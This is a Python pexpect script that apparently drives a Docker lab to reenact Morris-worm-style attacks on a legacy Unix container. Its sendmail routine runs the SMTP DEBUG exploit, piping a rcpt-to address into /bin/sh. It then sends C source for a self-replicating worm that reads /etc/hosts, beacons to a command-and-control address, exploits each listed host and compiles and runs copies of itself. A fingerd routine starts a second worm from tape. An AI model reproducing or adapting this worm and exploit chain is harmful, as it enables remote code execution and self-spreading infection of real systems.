import sys
import pexpect
import time

def run_sendmail():
    # 1. Attach to target-prime console
    print("[+] Attaching to target-prime...")
    child = pexpect.spawn('docker attach target-prime', encoding='utf-8')
    
    # Wait 5 seconds for the container to settle
    time.sleep(5)
    
    # Send an extra Enter to wake up the console and trigger the login prompt
    child.sendline('\r')
    print("[+] Sent wake-up Enter.")

    # 2. Login Handling
    child.expect('login:')
    child.sendline('root')
    child.expect('# ')
    print("[+] Logged in. Starting SMTP handshake...")

    # 3. SMTP Exploit Handshake
    # Each command is followed by a 2s delay as requested
    child.sendline('telnet node-1 25')
    time.sleep(2)
    
    child.sendline('DEBUG')
    time.sleep(2)
    
    child.sendline('mail from:<attacker>')
    time.sleep(2)
    
    # Passing the literal $ via double backslash
    child.sendline('rcpt to:<"| sed \'1,/^\\$/d\' | /bin/sh">')
    time.sleep(2)
    
    child.sendline('data')
    time.sleep(2)

    # 4. The Payload Block
    # This is sent through the telnet pipe into the 'sh' we opened in the rcpt step
    payload = """cd /tmp
cat > worm_final.c <<'EOF'
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>

#define C2_SERVER "172.20.0.11"
#define C2_PORT 1337

beacon(ip)
char *ip;
{
    int sock;
    struct sockaddr_in server;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock >= 0) {
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr(C2_SERVER);
        server.sin_port = htons(C2_PORT);
        if (connect(sock, &server, sizeof(server)) >= 0) {
            write(sock, "Infecting: ", 11);
            write(sock, ip, strlen(ip));
            write(sock, "\\n", 1);
        }
        close(sock);
    }
}

infect(target_ip)
char *target_ip;
{
    int sock;
    struct sockaddr_in target;
    char buf[1024];
    FILE *self;
    char line[128];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(target_ip);
    target.sin_port = htons(25);

    if (connect(sock, &target, sizeof(target)) < 0) {
        close(sock);
        return;
    }
    sleep(2);
    read(sock, buf, 1023);

    write(sock, "DEBUG\\r\\n", 7); sleep(1);
    write(sock, "mail from:<root>\\r\\n", 18); sleep(1);
    write(sock, "rcpt to:<\\"| /bin/sed '1,/^$/d' | /bin/sh\\">\\r\\n", 44); sleep(1);
    write(sock, "DATA\\r\\n", 6); sleep(1);
    write(sock, "\\r\\n", 2); 

    write(sock, "cd /tmp\\n", 8);
    write(sock, "cat > worm_final.c << 'SHUTDOWN'\\n", 33);
    
    self = fopen("worm_final.c", "r");
    if (self != NULL) {
        while (fgets(line, 128, self) != NULL) {
            write(sock, line, strlen(line));
        }
        fclose(self);
    }
    write(sock, "SHUTDOWN\\n", 9);

    write(sock, "/etc/ping 172.20.0.10 64 2\\n", 27);
    write(sock, "/bin/cc -o worm_final worm_final.c\\n", 35);
    write(sock, "./worm_final &\\n", 15);

    write(sock, ".\\r\\n", 3); sleep(1);
    write(sock, "QUIT\\r\\n", 6);
    close(sock);
}

main()
{
    FILE *fp;
    char line[128];
    char ip[64];

    fp = fopen("/etc/hosts", "r");
    if (fp == NULL) exit(1);

    while (fgets(line, 128, fp) != NULL) {
        if (line[0] == '#' || line[0] == '\\n' || line[0] == ' ')
            continue;
        if (sscanf(line, "%s", ip) != 1)
            continue;

        if (strcmp(ip, "127.0.0.1") == 0) continue;
        if (strcmp(ip, "10.0.2.15") == 0) continue;

        beacon(ip);
        infect(ip);
    }
    fclose(fp);
    exit(0);
}
EOF
/bin/cc -o worm_final worm_final.c
./worm_final
/etc/ping 172.20.0.10 64 2
.
QUIT
"""

    # 5. Send the whole block
    print("[+] Sending payload block through SMTP tunnel...")
    child.sendline(payload)
    
    # 6. Wait for the shell to return
    print("[+] Payload sent. Waiting for remote execution...")
    # This might take a moment as node-2 compiles the code
    child.expect('# ', timeout=120)
    
    print("[***] Sequence Complete. Target-prime has infected Node-1.")
    child.interact()

def run_fingerd():
    # 1. Attach to target-prime console
    print("[+] Attaching to target-prime...")
    child = pexpect.spawn('docker attach target-prime', encoding='utf-8')
    
    # Wait 5 seconds for the container to settle
    time.sleep(5)
    
    # Send an extra Enter to wake up the console and trigger the login prompt
    child.sendline('\r')
    print("[+] Sent wake-up Enter.")

    # 2. Login Handling
    child.expect('login:')
    child.sendline('root')
    child.expect('# ')
    print("[+] Logged in")

    # 5. Unpack the tar file manually
    print("[+] Adding fingerd worm files")
    child.expect('# ')
    child.sendline('cd /tmp')
    child.expect('# ')
    child.sendline('mt -f /dev/rmt12 rew')
    child.expect('# ')
    child.sendline('tar xvf /dev/rmt12')
    child.expect('# ')
    child.sendline('cc worm_bsd.c -o worm_bsd')
    child.expect('# ')
    
    # 6. Wait for the shell to return
    print("[+] Files sent. Starting worm")
    child.sendline('./worm_bsd')
    
    print("[***] Sequence Complete. Worm started on target-prime")
    child.interact()

if __name__ == "__main__":
    if "-fingerd" in sys.argv:
        run_fingerd()
    elif "-sendmail" in sys.argv:
        run_sendmail()
